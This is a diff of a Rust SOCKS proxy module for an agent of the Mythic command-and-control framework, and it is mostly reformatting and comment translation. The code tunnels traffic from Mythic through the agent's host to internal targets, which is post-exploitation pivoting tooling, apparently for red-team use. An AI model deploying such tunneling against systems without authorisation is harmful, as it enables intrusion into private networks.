@@ -148,7 +148,6 @@ fn parse_connect(decoded: &[u8]) -> Result<(String, u16), Box<dyn Error>> {
 
 /* ----------- Extract socks messages from continued_task.parameters --------- */
 
-
 fn as_string_or_number(v: &Value) -> Option<String> {
     if let Some(s) = v.as_str() {
         return Some(s.to_string());
@@ -174,12 +173,14 @@ fn extract_socks_packet(msg: &Value) -> Result<Option<(String, bool, Value)>, Bo
     // Case 1: top-level packet
     if let Some(sidv) = msg.get("server_id") {
         if let Some(server_id) = as_string_or_number(sidv) {
-            let exit = msg.get("exit")
+            let exit = msg
+                .get("exit")
                 .and_then(|v| v.as_bool())
                 .or_else(|| msg.get("close").and_then(|v| v.as_bool()))
                 .unwrap_or(false);
 
-            let data_b64 = msg.get("data")
+            let data_b64 = msg
+                .get("data")
                 .or_else(|| msg.get("chunk_data"))
                 .and_then(|v| v.as_str())
                 .unwrap_or("");
@@ -189,7 +190,11 @@ fn extract_socks_packet(msg: &Value) -> Result<Option<(String, bool, Value)>, Bo
                 "data": data_b64,
                 "exit": exit
             });
-            return Ok(Some((normalized["server_id"].as_str().unwrap().to_string(), exit, normalized)));
+            return Ok(Some((
+                normalized["server_id"].as_str().unwrap().to_string(),
+                exit,
+                normalized,
+            )));
         }
     }
 
@@ -197,13 +202,10 @@ fn extract_socks_packet(msg: &Value) -> Result<Option<(String, bool, Value)>, Bo
     if let Some(params_val) = msg.get("parameters") {
         // Parse stringified JSON or clone object
         let mut inner: Value = match params_val {
-            Value::String(s) => {
-                // It’s a JSON string (your logs show starts_with_brace=true)
-                match serde_json::from_str::<Value>(s) {
-                    Ok(v) => v,
-                    Err(_) => return Ok(None),
-                }
-            }
+            Value::String(s) => match serde_json::from_str::<Value>(s) {
+                Ok(v) => v,
+                Err(_) => return Ok(None),
+            },
             v @ Value::Object(_) => v.clone(),
             _ => return Ok(None),
         };
@@ -222,12 +224,14 @@ fn extract_socks_packet(msg: &Value) -> Result<Option<(String, bool, Value)>, Bo
         };
 
         // Normalize fields
-        let data_b64 = inner.get("data")
+        let data_b64 = inner
+            .get("data")
             .or_else(|| inner.get("chunk_data"))
             .and_then(|v| v.as_str())
             .unwrap_or("");
 
-        let exit = inner.get("exit")
+        let exit = inner
+            .get("exit")
             .and_then(|v| v.as_bool())
             .or_else(|| inner.get("close").and_then(|v| v.as_bool()))
             .unwrap_or(false);
@@ -237,19 +241,21 @@ fn extract_socks_packet(msg: &Value) -> Result<Option<(String, bool, Value)>, Bo
             "data": data_b64,
             "exit": exit
         });
-        return Ok(Some((normalized["server_id"].as_str().unwrap().to_string(), exit, normalized)));
+        return Ok(Some((
+            normalized["server_id"].as_str().unwrap().to_string(),
+            exit,
+            normalized,
+        )));
     }
 
     Ok(None)
 }
 
-
-
 /* ----------------------------- Session handler ---------------------------- */
 
 async fn handle_connection(
-    parent_task_id: String,                     // for debug to Mythic
-    server_id: String,                         // SOCKS session id from Mythic
+    parent_task_id: String, // for debug to Mythic
+    server_id: String,      // SOCKS session id from Mythic
     mut sess_rx: tokio_mpsc::UnboundedReceiver<Value>,
     tx_out: std_mpsc::Sender<Value>,
 ) -> Result<(), Box<dyn Error>> {
@@ -295,7 +301,10 @@ async fn handle_connection(
                 &tx_out,
                 &parent_task_id,
                 "SOCKS CONNECT parse failed",
-                format!("server_id={server_id}; err={e} hex={}", hex_preview(&decoded, 64)),
+                format!(
+                    "server_id={server_id}; err={e} hex={}",
+                    hex_preview(&decoded, 64)
+                ),
             );
             let _ = send_data(&tx_out, &server_id, &build_reply(0x07, None), true);
             return Ok(());
@@ -310,29 +319,30 @@ async fn handle_connection(
     );
 
     // Connect to remote with timeout
-    let remote = match timeout(Duration::from_secs(15), TcpStream::connect((addr.as_str(), port))).await {
-        Ok(Ok(s)) => s,
-        Ok(Err(e)) => {
-            debug_to_mythic(
-                &tx_out,
-                &parent_task_id,
-                "SOCKS connect failed",
-                format!("server_id={server_id}; target={addr}:{port}; err={e}"),
-            );
-            let _ = send_data(&tx_out, &server_id, &build_reply(0x01, None), true);
-            return Ok(());
-        }
-        Err(_) => {
-            debug_to_mythic(
-                &tx_out,
-                &parent_task_id,
-                "SOCKS connect timeout",
-                format!("server_id={server_id}; target={addr}:{port}"),
-            );
-            let _ = send_data(&tx_out, &server_id, &build_reply(0x01, None), true);
-            return Ok(());
-        }
-    };
+    let remote =
+        match timeout(Duration::from_secs(15), TcpStream::connect((addr.as_str(), port))).await {
+            Ok(Ok(s)) => s,
+            Ok(Err(e)) => {
+                debug_to_mythic(
+                    &tx_out,
+                    &parent_task_id,
+                    "SOCKS connect failed",
+                    format!("server_id={server_id}; target={addr}:{port}; err={e}"),
+                );
+                let _ = send_data(&tx_out, &server_id, &build_reply(0x01, None), true);
+                return Ok(());
+            }
+            Err(_) => {
+                debug_to_mythic(
+                    &tx_out,
+                    &parent_task_id,
+                    "SOCKS connect timeout",
+                    format!("server_id={server_id}; target={addr}:{port}"),
+                );
+                let _ = send_data(&tx_out, &server_id, &build_reply(0x01, None), true);
+                return Ok(());
+            }
+        };
 
     // Send success reply w/ bound address
     let bound = remote.local_addr().ok();
@@ -344,7 +354,9 @@ async fn handle_connection(
         "SOCKS connect ok",
         format!(
             "server_id={server_id}; target={addr}:{port}; bound={}",
-            bound.map(|s| s.to_string()).unwrap_or_else(|| "unknown".into())
+            bound
+                .map(|s| s.to_string())
+                .unwrap_or_else(|| "unknown".into())
         ),
     );
 
@@ -352,8 +364,8 @@ async fn handle_connection(
     let (mut remote_r, mut remote_w) = remote.into_split();
 
     // Byte counters for final stats
-    let bytes_up = std::sync::Arc::new(std::sync::atomic::AtomicU64::new(0));   // remote→Mythic
-    let bytes_dn = std::sync::Arc::new(std::sync::atomic::AtomicU64::new(0));   // Mythic→remote
+    let bytes_up = std::sync::Arc::new(std::sync::atomic::AtomicU64::new(0)); // remote→Mythic
+    let bytes_dn = std::sync::Arc::new(std::sync::atomic::AtomicU64::new(0)); // Mythic→remote
 
     // remote -> Mythic
     let tx_for_a2m = tx_out.clone();
@@ -468,7 +480,7 @@ pub fn handle_socks(
     tx: &std_mpsc::Sender<Value>,
     rx: std_mpsc::Receiver<Value>,
 ) -> Result<(), Box<dyn Error>> {
-    // Primer mensaje: AgentTask
+    // First message is the AgentTask
     let task_val = rx.recv()?;
     let task: AgentTask = serde_json::from_value(task_val)?;
 
@@ -478,71 +490,74 @@ pub fn handle_socks(
         "Dispatcher starting"
     ))?;
 
-    // Puente std::mpsc -> tokio::mpsc
-    // Bridge std::mpsc -> tokio::mpsc
+    // Bridge std::mpsc -> tokio::mpsc (fan-out top-level "socks" arrays and single packets)
     let (bridge_tx, mut bridge_rx) = tokio_mpsc::unbounded_channel::<Value>();
     {
         let parent_id = task.id.clone();
         let tx_clone = tx.clone();
         std::thread::spawn(move || {
-            debug_to_mythic(&tx_clone, &parent_id, "SOCKS bridge spawn", "blocking→async bridge started");
-    
+            debug_to_mythic(
+                &tx_clone,
+                &parent_id,
+                "SOCKS bridge spawn",
+                "blocking→async bridge started",
+            );
+
             while let Ok(v) = rx.recv() {
-                // 1) Top-level "socks" array from Mythic get_tasking/post_response
+                // 1) Mythic top-level "socks": [ ... ]
                 if let Some(arr) = v.get("socks").and_then(|x| x.as_array()) {
                     for item in arr {
                         let _ = bridge_tx.send(item.clone());
                     }
                     continue;
                 }
-    
-                // 2) Sometimes SOCKS comes nested inside `parameters` (stringified JSON or object)
+
+                // 2) Sometimes SOCKS comes inside `parameters` (stringified JSON or object)
                 if let Some(params_val) = v.get("parameters") {
                     let inner: Value = match params_val {
                         Value::String(s) => serde_json::from_str::<Value>(s).unwrap_or(Value::Null),
                         v @ Value::Object(_) => v.clone(),
                         _ => Value::Null,
                     };
-    
-                    // 2a) Nested "socks" array
+
+                    // 2a) Nested "socks": [ ... ]
                     if let Some(arr) = inner.get("socks").and_then(|x| x.as_array()) {
                         for item in arr {
                             let _ = bridge_tx.send(item.clone());
                         }
                         continue;
                     }
-    
-                    // 2b) Single SOCKS packet embedded
-                    let looks_like_packet =
-                        inner.get("server_id").is_some() &&
-                        (inner.get("data").is_some() || inner.get("chunk_data").is_some());
-    
+
+                    // 2b) Single embedded packet
+                    let looks_like_packet = inner.get("server_id").is_some()
+                        && (inner.get("data").is_some() || inner.get("chunk_data").is_some());
                     if looks_like_packet {
                         let _ = bridge_tx.send(inner);
                         continue;
                     }
                 }
-    
-                // 3) Already looks like a single SOCKS packet at top-level
-                let looks_like_packet =
-                    v.get("server_id").is_some() &&
-                    (v.get("data").is_some() || v.get("chunk_data").is_some());
-    
+
+                // 3) Already a single packet at top-level
+                let looks_like_packet = v.get("server_id").is_some()
+                    && (v.get("data").is_some() || v.get("chunk_data").is_some());
                 if looks_like_packet {
                     let _ = bridge_tx.send(v);
                     continue;
                 }
-    
-                // 4) Not SOCKS-related -> optional: keep your skip logs in dispatcher
-                // (Don't forward; otherwise you flood the dispatcher with acks)
+
+                // 4) Not SOCKS-related -> dispatcher will sample-skip
             }
-    
-            debug_to_mythic(&tx_clone, &parent_id, "SOCKS bridge ended", "blocking receiver closed");
+
+            debug_to_mythic(
+                &tx_clone,
+                &parent_id,
+                "SOCKS bridge ended",
+                "blocking receiver closed",
+            );
         });
     }
 
-
-    // Runtime y dispatcher
+    // Start runtime and run dispatcher
     let rt = tokio::runtime::Runtime::new()?;
     rt.block_on(async {
         let mut sessions: HashMap<String, tokio_mpsc::UnboundedSender<Value>> = HashMap::new();
@@ -559,12 +574,12 @@ pub fn handle_socks(
         loop {
             let raw_msg = match bridge_rx.recv().await {
                 Some(v) => v,
-                None => break, // se cerró el puente
+                None => break, // bridge closed
             };
 
             match extract_socks_packet(&raw_msg) {
                 Ok(Some((server_id, exit, socks_msg))) => {
-                    // Crear sesión si no existe y reenviar
+                    // lazily create route & forward
                     let entry = sessions.entry(server_id.clone()).or_insert_with(|| {
                         let (sess_tx, sess_rx) = tokio_mpsc::unbounded_channel();
                         let sid = server_id.clone();
@@ -579,7 +594,8 @@ pub fn handle_socks(
                         );
 
                         tokio::spawn(async move {
-                            if let Err(e) = handle_connection(parent_id, sid, sess_rx, tx_out).await
+                            if let Err(e) =
+                                handle_connection(parent_id, sid, sess_rx, tx_out).await
                             {
                                 eprintln!("socks session ended with error: {e}");
                             }
@@ -600,19 +616,28 @@ pub fn handle_socks(
                     }
                 }
 
-                // No-SOCKS (acks de Mythic, etc). Muestra muestra ocasional.
+                // Non-SOCKS (likely Mythic acks) – sample occasionally
                 Ok(None) => {
                     non_socks_seen += 1;
                     if non_socks_seen <= 5 || non_socks_seen % 100 == 0 {
-                
+                        // peek actual parameters content to help debugging
                         if let Some(Value::String(s)) = raw_msg.get("parameters") {
-                            debug_to_mythic(&tx, &parent_task_id, "parameters.peek", str_preview(s, 250));
+                            debug_to_mythic(
+                                &tx,
+                                &parent_task_id,
+                                "parameters.peek",
+                                str_preview(s, 250),
+                            );
                         } else if let Some(p) = raw_msg.get("parameters") {
-                            // Por si `parameters` ya viene como objeto y no string
-                            debug_to_mythic(&tx, &parent_task_id, "parameters.peek", format!("{p:?}"));
+                            debug_to_mythic(
+                                &tx,
+                                &parent_task_id,
+                                "parameters.peek",
+                                format!("{p:?}"),
+                            );
                         }
-                
-                        // Resumen de claves top-level
+
+                        // summarize top-level keys
                         let keys_top: Vec<String> = raw_msg
                             .as_object()
                             .map(|m| {
@@ -621,25 +646,30 @@ pub fn handle_socks(
                                 v
                             })
                             .unwrap_or_default();
-                
-                        // Resumen de `parameters` sin closures anidados
-                        let params_preview: String = if let Some(p) = raw_msg.get("parameters") {
-                            match p {
-                                Value::String(s) => {
-                                    let s = s.trim();
-                                    format!("str(len={}, starts_with_brace={})", s.len(), s.starts_with('{'))
+
+                        // summarize `parameters` shape
+                        let params_preview: String =
+                            if let Some(p) = raw_msg.get("parameters") {
+                                match p {
+                                    Value::String(s) => {
+                                        let s = s.trim();
+                                        format!(
+                                            "str(len={}, starts_with_brace={})",
+                                            s.len(),
+                                            s.starts_with('{')
+                                        )
+                                    }
+                                    Value::Object(o) => {
+                                        let mut v: Vec<String> = o.keys().cloned().collect();
+                                        v.sort();
+                                        format!("obj(keys={:?})", v)
+                                    }
+                                    other => format!("{:?}", other),
                                 }
-                                Value::Object(o) => {
-                                    let mut v: Vec<String> = o.keys().cloned().collect();
-                                    v.sort();
-                                    format!("obj(keys={:?})", v)
-                                }
-                                other => format!("{:?}", other),
-                            }
-                        } else {
-                            "<none>".to_string()
-                        };
-                
+                            } else {
+                                "<none>".to_string()
+                            };
+
                         debug_to_mythic(
                             &tx,
                             &parent_task_id,
@@ -651,8 +681,7 @@ pub fn handle_socks(
                     }
                 }
 
-
-                // Paquete inesperado
+                // Unexpected payload – log briefly
                 Err(e) => {
                     let top_keys = raw_msg.as_object().map(|m| {
                         let mut v: Vec<String> = m.keys().cloned().collect();
@@ -681,8 +710,6 @@ pub fn handle_socks(
     Ok(())
 }
 
-
-
 /// Back-compat for existing call site in tasking.rs
 pub fn setup_socks(
     tx: &std_mpsc::Sender<Value>,
@@ -690,4 +717,3 @@ pub fn setup_socks(
 ) -> Result<(), Box<dyn Error>> {
     handle_socks(tx, rx)
 }
-
